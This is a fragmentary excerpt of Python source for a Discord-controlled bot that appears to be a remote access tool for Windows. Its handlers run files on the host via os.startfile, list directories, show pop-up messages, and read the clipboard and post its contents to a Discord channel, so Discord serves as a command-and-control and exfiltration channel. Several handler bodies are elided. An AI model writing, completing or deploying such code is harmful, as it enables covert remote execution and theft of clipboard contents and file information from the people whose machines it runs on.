...
async def execute_combined_command(message, combined_command):
    # Split the combined command by spaces
    commands = combined_command.split('--')

    for i, command in enumerate(commands):
        # Check if the command is a wait instruction
        wait_match = re.match(r'\{wait\.(\d+)\}', command)
        if wait_match:
            # Wait for the specified time
            wait_time = float(wait_match.group(1))
            await asyncio.sleep(wait_time)
        else:
            # Match commands like `send{pizza,msg,title}` and transform them into `!send pizza msg title`
            cmd_match = re.match(r'(\w+)\{([^}]+)\}', command)
            if cmd_match:
                command_name = cmd_match.group(1)
                args = cmd_match.group(2).replace(',', ' ')
                final_command = f'!{command_name} {args}'
                await message.channel.send(final_command)
            else:
                # Handle simple commands like `restart`, transform them into `!restart`
                final_command = f'!{command.strip()}'
                await message.channel.send(final_command)
...
async def on_message(message):
    ...
    #Command: message
        ...
        try:
            ...
            thread = threading.Thread(target=show_message, args=(title, msg))
            thread.start()
            await send_embed(message.channel.id, "Message Sent", f"Showed message \"{msg}\"")
        except Exception as e:
            await send_embed(message.channel.id, "Error", f"```{str(e)}```")
    ...
    # Command: listdir
        ...
        try:
            ...
            if files:
                if len('\n'.join(files)) > 2048:
                    # List is too long, send as a file
                    file_content = '\n'.join(files)
                    with io.BytesIO(file_content.encode('utf-8')) as file:
                        await message.channel.send(file=discord.File(file, 'file_list.txt'))
                    await send_embed(message.channel.id, "File List", f"The file list is too long and has been sent as `file_list.txt`.")
                else:
                    # List is short enough to fit in an embed
    ...
    # Command: run
        ...
        try:
            os.startfile(os.path.join(current_dir, message.content[5:]))
    ...
    # Command: clipboard
        ...
        try:
            ...
            await send_embed(message.channel.id, "Clipboard Content", f"```{clipboard_content}```")
        except Exception as e:
            await send_embed(message.channel.id, "Error", f"```{str(e)}```")
